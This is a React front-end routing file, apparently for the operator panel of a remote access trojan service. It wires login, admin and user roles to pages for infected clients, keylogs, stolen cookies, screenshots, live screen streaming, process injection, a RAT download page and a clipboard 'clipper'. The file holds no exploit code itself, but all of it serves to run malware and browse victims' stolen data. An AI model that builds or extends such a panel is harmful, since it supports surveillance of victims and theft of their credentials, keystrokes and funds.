import { Navigate, Route, Routes } from 'react-router-dom'
import { useState, useEffect } from 'react'
import AdminDashboard from './pages/Dashboard/adminDashboard'
import Dashboard from './pages/Dashboard/Dashboard'
import ClientsPage from './pages/Clients/ClientsPage'
import FilesPage from './pages/Files/FilesPage'
import KeylogsPage from './pages/Keylogs/KeylogsPage'
import CookiesPage from './pages/Cookies/CookiesPage'
import ScannedDataPage from './pages/ScannedData/ScannedDataPage'
import ScreenshotsPage from './pages/Screenshots/ScreenshotsPage'
import StreamPage from './pages/Stream/StreamPage'
import SettingsPage from './pages/Settings/SettingsPage'
import ProcessInjectionPage from './pages/Injection/ProcessInjectionPage'
import UserManagementPage from './pages/UserManagement/UserManagementPage'
import RatDownloadPage from './pages/RatDownload/RatDownloadPage'
import ClipperPage from './pages/Clipper/ClipperPage'
import AdminLayout from './layouts/adminLayout'
import GenLayout from './layouts/genLayout'
import { DatabaseTestPage } from './pages/DatabaseTest/DatabaseTestPage'
import { DashboardStoreProvider } from './store/dashboardStore.ts'
import { ToastProvider } from './UI/Toast'
import LoginPage from './pages/Auth/LoginPage'
import { clearAuth, setAuth } from './utils/websocket'

interface User {
  id: string;
  username: string;
  role: 'admin' | 'user';
}

function App() {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Verify session via HttpOnly cookie
    fetch('/api/auth/me', { credentials: 'include' })
      .then(res => {
        if (res.ok) return res.json();
        throw new Error('Not authenticated');
      })
      .then(data => {
        setUser(data.user);
        localStorage.setItem('user', JSON.stringify(data.user));
      })
      .catch(() => {
        setUser(null);
        localStorage.removeItem('user');
      })
      .finally(() => setLoading(false));
  }, []);

  const handleLogin = (userData: User) => {
    setUser(userData);
    setAuth('', userData);
  };

  const handleLogout = async () => {
    setUser(null);
    await clearAuth();
  };

  if (loading) {
    return (
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        height: '100vh',
        background: '#1a1a1a',
        color: 'white'
      }}>
        Loading...
      </div>
    );
  }

  return (
    <DashboardStoreProvider>
      <ToastProvider>
      <Routes>
        {/* Public routes */}
        <Route
          path="/login"
          element={
            user ? (
              user.role === 'admin' ? (
                <Navigate to="/admin/dashboard" replace />
              ) : (
                <Navigate to="/user/dashboard" replace />
              )
            ) : (
              <LoginPage onLogin={handleLogin} />
            )
          }
        />
        
        {/* Protected admin routes - only for admin users */}
        <Route path="/admin" element={
          user ? (
            user.role === 'admin' ? (
              <AdminLayout user={user} onLogout={handleLogout} />
            ) : (
              <Navigate to="/user/dashboard" replace />
            )
          ) : (
            <Navigate to="/login" replace />
          )
        }>
          <Route index element={<Navigate to="dashboard" replace />} />
          <Route path="dashboard" element={<AdminDashboard />} />
          <Route path="clients" element={<ClientsPage />} />
          <Route path="files" element={<FilesPage />} />
          <Route path="screenshots" element={<ScreenshotsPage />} /><Route path="stream" element={<StreamPage />} />
          <Route path="keylogs" element={<KeylogsPage />} />
          <Route path="cookies" element={<CookiesPage />} />
          <Route path="scanned-data" element={<ScannedDataPage />} />
          <Route path="process-injection" element={<ProcessInjectionPage />} />
          <Route path="rat-download" element={<RatDownloadPage />} />
          <Route path="clipper" element={<ClipperPage />} />
          <Route path="user-management" element={<UserManagementPage />} />
          <Route path="settings" element={<SettingsPage />} />
        </Route>

        {/* Protected user routes - for regular users */}
        <Route path="/user" element={
          user ? (
            user.role === 'user' ? (
              <GenLayout user={user} onLogout={handleLogout} />
            ) : (
              <Navigate to="/admin/dashboard" replace />
            )
          ) : (
            <Navigate to="/login" replace />
          )
        }>
          <Route index element={<Navigate to="dashboard" replace />} />
          <Route path="dashboard" element={<Dashboard />} />
          <Route path="clients" element={<ClientsPage />} />
          <Route path="files" element={<FilesPage />} />
          <Route path="screenshots" element={<ScreenshotsPage />} /><Route path="stream" element={<StreamPage />} />
          <Route path="keylogs" element={<KeylogsPage />} />
          <Route path="cookies" element={<CookiesPage />} />
          <Route path="scanned-data" element={<ScannedDataPage />} />
          <Route path="rat-download" element={<RatDownloadPage />} />
          <Route path="clipper" element={<ClipperPage />} />
          {/* Regular users don't get process injection, user management or settings */}
        </Route>

        {/* General routes */}
        <Route element={<GenLayout />}>
          <Route path="/" element={
            user ? (
              user.role === 'admin' ? (
                <Navigate to="/admin/dashboard" replace />
              ) : (
                <Navigate to="/user/dashboard" replace />
              )
            ) : (
              <Navigate to="/login" replace />
            )
          } />
          <Route path="/database-test" element={<DatabaseTestPage />} />
        </Route>

        {/* Catch-all route */}
        <Route path="*" element={
          user ? (
            user.role === 'admin' ? (
              <Navigate to="/admin/dashboard" replace />
            ) : (
              <Navigate to="/user/dashboard" replace />
            )
          ) : (
            <Navigate to="/login" replace />
          )
        } />
      </Routes>
      </ToastProvider>
    </DashboardStoreProvider>
  )
}

export default App
